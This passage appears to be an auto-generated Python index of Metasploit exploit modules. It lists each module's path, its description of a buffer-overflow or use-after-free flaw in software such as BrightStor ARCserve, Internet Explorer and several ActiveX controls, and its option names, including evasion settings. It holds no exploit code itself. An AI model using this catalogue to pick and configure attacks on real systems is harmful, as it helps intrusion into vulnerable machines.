			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			DynamicSehRecord = 'DynamicSehRecord'
			required_HNAME = 'HNAME'

	class windows_brightstor_message_engine_72(object):
		"""
		
          This module exploits a buffer overflow in Computer Associates BrightStor ARCserve Backup
        11.1 - 11.5 SP2. By sending a specially crafted RPC request, an attacker could overflow
        the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/message_engine_72'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_brightstor_lgserver(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request, an attacker could
        overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/lgserver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms06_013_createtextrange(object):
		"""
		
          This module exploits a code execution vulnerability in Microsoft Internet Explorer.
        Both IE6 and IE7 (Beta 2) are vulnerable. It will corrupt memory  in a way, which, under
        certain circumstances, can lead to an invalid/corrupt table pointer dereference. EIP will point
        to a very remote, non-existent memory location. This module is the result of merging three
        different exploit submissions and has only been reliably tested against Windows XP SP2.
        This vulnerability was independently discovered by multiple parties. The heap spray method
        used by this exploit was pioneered by Skylined.
      
		"""

		path = 'windows/browser/ms06_013_createtextrange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms13_037_svg_dashstyle(object):
		"""
		
          This module exploits an integer overflow vulnerability on Internet Explorer.
        The vulnerability exists in the handling of the dashstyle.array length for vml
        shapes on the vgx.dll module.

          The exploit has been built and tested specifically against Windows 7 SP1 with
        Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to
        bypass ASLR, and by default the info leak is used. To make sure the leak is
        successful, the ntdll version should be either v6.1.7601.17514 (the default dll
        version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725
        (installed after apply MS12-001). If the target doesn't have the version the exploit
        wants, it will refuse to attack by sending a fake 404 message (webpage not found).

          If you wish to try the JRE6 component instead to bypass ASLR, you can set the
        advanced datastore option to 'JRE6'. If JRE6 is chosen but the target doesn't
        have this particular component, the exploit will also refuse to attack by
        sending a 404 message.
      
		"""

		path = 'windows/browser/ms13_037_svg_dashstyle'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			OBFUSCATE = 'OBFUSCATE'
			required_ROP = 'ROP'

	class windows_browser_softartisans_getdrivename(object):
		"""
		
          This module exploits a stack buffer overflow in SoftArtisans XFile FileManager ActiveX control
        (SAFmgPwd.dll 2.0.5.3). When sending an overly long string to the GetDriveName() method
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/softartisans_getdrivename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms16_051_vbscript(object):
		"""
		
        This module exploits the memory corruption vulnerability (CVE-2016-0189)
        present in the VBScript engine of Internet Explorer 11.
      
		"""

		path = 'windows/browser/ms16_051_vbscript'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_enjoysapgui_preparetoposthtml(object):
		"""
		
          This module exploits a stack buffer overflow in SAP KWEdit ActiveX
        Control (kwedit.dll 6400.1.1.41) provided by EnjoySAP GUI. By sending
        an overly long string to the "PrepareToPostHTML()" method, an attacker
        may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/enjoysapgui_preparetoposthtml'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms06_001_wmf_setabortproc(object):
		"""
		
          This module exploits a vulnerability in the GDI library included with
        Windows XP and 2003. This vulnerability uses the 'Escape' metafile function
        to execute arbitrary code through the SetAbortProc procedure. This module
        generates a random WMF record stream for each request.
      
		"""

		path = 'windows/browser/ms06_001_wmf_setabortproc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_realplayer_console(object):
		"""
		
          This module exploits a heap corruption vulnerability in the RealPlayer ActiveX control.
        By sending a specially crafted string to the 'Console' property
        in the rmoc3260.dll control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/realplayer_console'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_trendmicro_extsetowner(object):
		"""
		
          This module exploits a remote code execution vulnerability in Trend Micro
        Internet Security Pro 2010 ActiveX.
        When sending an invalid pointer to the extSetOwner() function of UfPBCtrl.dll
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/trendmicro_extsetowner'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_hp_loadrunner_addfolder(object):
		"""
		
          This module exploits a stack buffer overflow in Persits Software Inc's
        XUpload ActiveX control(version 2.1.0.1) thats included in HP LoadRunner 9.0.
        By passing an overly long string to the AddFolder method, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/browser/hp_loadrunner_addfolder'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_novelliprint_datetime(object):
		"""
		
        This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When
        passing a specially crafted date/time string via certain parameters to ienipp.ocx
        an attacker can execute arbitrary code.

        NOTE: The "operation" variable must be set to a valid command in order to reach this
        vulnerability.
      
		"""

		path = 'windows/browser/novelliprint_datetime'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_novelliprint_executerequest(object):
		"""
		
          This module exploits a stack buffer overflow in Novell iPrint Client 4.26. When
        sending an overly long string to the ExecuteRequest() property of ienipp.ocx
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/novelliprint_executerequest'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ie_execcommand_uaf(object):
		"""
		
        This module exploits a vulnerability found in Microsoft Internet Explorer (MSIE). When
        rendering an HTML page, the CMshtmlEd object gets deleted in an unexpected manner,
        but the same memory is reused again later in the CMshtmlEd::Exec() function, leading
        to a use-after-free condition.

        Please note that this vulnerability has been exploited in the wild since Sep 14 2012.

        Also note that presently, this module has some target dependencies for the ROP chain to be
        valid. For WinXP SP3 with IE8, msvcrt must be present (as it is by default).
        For Vista or Win7 with IE8, or Win7 with IE9, JRE 1.6.x or below must be installed (which
        is often the case).
      
		"""

		path = 'windows/browser/ie_execcommand_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ebook_flipviewer_fviewerloading(object):
		"""
		
        This module exploits a stack buffer overflow in E-BOOK Systems FlipViewer 4.0.
        The vulnerability is caused due to a boundary error in the
        FViewerLoading (FlipViewerX.dll) ActiveX control when handling the
        "LoadOpf()" method.
      
		"""

		path = 'windows/browser/ebook_flipviewer_fviewerloading'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_002_ie_object(object):
		"""
		
          This module exploits a vulnerability found in Internet Explorer's
        mshtml component.  Due to the way IE handles objects in memory, it is
        possible to cause a pointer in CTableRowCellsCollectionCacheItem::GetNext
        to be used even after it gets freed, therefore allowing remote code
        execution under the context of the user.

          This particular vulnerability was also one of 2012's Pwn2Own
        challenges, and was later explained by Peter Vreugdenhil with exploitation
        details.  Instead of Peter's method, this module uses heap spraying like
        the 99% to store a specially crafted memory layout before re-using the
        freed memory.
      
		"""

		path = 'windows/browser/ms10_002_ie_object'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_blackice_downloadimagefileurl(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file system
        by abusing the "DownloadImageFileURL" method in the Black Ice BIImgFrm.ocx ActiveX
        Control (BIImgFrm.ocx 12.0.0.0).  Code exeuction can be acheived by first uploading the
        payload to the remote machine, and then upload another mof file, which enables Windows
        Management Instrumentation service to execute the binary. Please note that this module
        currently only works for Windows before Vista.  Also, a similar issue is reported in
        BIDIB.ocx (10.9.3.0) within the Barcode SDK.
      
		"""

		path = 'windows/browser/blackice_downloadimagefileurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_tumbleweed_filetransfer(object):
		"""
		
          This module exploits a stack buffer overflow in the vcst_eu.dll
        FileTransfer Module (1.0.0.5) ActiveX control in the Tumbleweed
        SecureTransport suite. By sending an overly long string to the
        TransferFile() 'remotefile' function, an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/browser/tumbleweed_filetransfer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_java_ws_arginject_altjvm(object):
		"""
		
          This module exploits a flaw in the Web Start plugin component of Sun Java
        Web Start. The arguments passed to Java Web Start are not properly validated.
        By passing the lesser known -J option, an attacker can pass arbitrary options
        directly to the Java runtime. By utilizing the -XXaltjvm option, as discussed
        by Ruben Santamarta, an attacker can execute arbitrary code in the context of
        an unsuspecting browser user.

        This vulnerability was originally discovered independently by both Ruben
        Santamarta and Tavis Ormandy. Tavis reported that all versions since version
        6 Update 10 "are believed to be affected by this vulnerability."

        In order for this module to work, it must be ran as root on a server that
        does not serve SMB. Additionally, the target host must have the WebClient
        service (WebDAV Mini-Redirector) enabled.
      
		"""

		path = 'windows/browser/java_ws_arginject_altjvm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
